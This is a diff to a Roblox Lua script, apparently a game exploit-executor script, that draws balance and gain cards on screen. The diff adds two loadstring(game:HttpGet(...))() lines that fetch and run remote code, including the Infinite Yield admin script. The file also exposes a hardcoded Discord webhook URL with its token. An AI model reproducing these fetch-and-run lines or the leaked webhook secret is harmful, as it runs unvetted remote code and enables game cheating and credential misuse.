@@ -7,8 +7,11 @@ local currencyName = "USD"
 local webhookURL = "https://discord.com/api/webhooks/1500212577391874189/TmdztJK1hWZEpwJh3XxvZwc9BrrYEkQ26755NLvoKfxBNxPjalT8fFQ3rk2Csw4o2e7M"
 local githubWhitelistURL = "https://raw.githubusercontent.com/chromawave2006/synapsexstreamsniper/refs/heads/main/whitelist"
 -- =================================================
+
+-- Load Additional Scripts
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
+
 local startTime = os.time()
 
 -- 1. UTILITIES
@@ -93,6 +96,7 @@ local function createCard(title, iconText, color)
     local card = Instance.new("Frame", container)
     card.Size = UDim2.new(0, 200, 1, 0)
     card.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Pure Black Background
+    card.BorderSizePixel = 0
     Instance.new("UICorner", card).CornerRadius = UDim.new(0, 15)
     local s = Instance.new("UIStroke", card)
     s.Thickness = 2; s.Color = color
@@ -112,7 +116,7 @@ local function createCard(title, iconText, color)
     val.BackgroundTransparency = 1
     val.Text = "..."
     val.TextColor3 = Color3.new(1,1,1)
-    val.TextSize = 28 -- Slightly smaller to fit big numbers
+    val.TextSize = 28 
     val.Font = Enum.Font.GothamBold
 
     local sub = Instance.new("TextLabel", card)
@@ -153,7 +157,7 @@ if moneyValue then
     task.spawn(function()
         while task.wait(0.5) do
             local rawCur = moneyValue.Value
-            local cur = math.floor(rawCur) -- REMOVES EXTRA NUMBERS
+            local cur = math.floor(rawCur) 
             
             balanceVal.Text = "$" .. cur
             gainVal.Text = "+$" .. (cur - initialBalance)
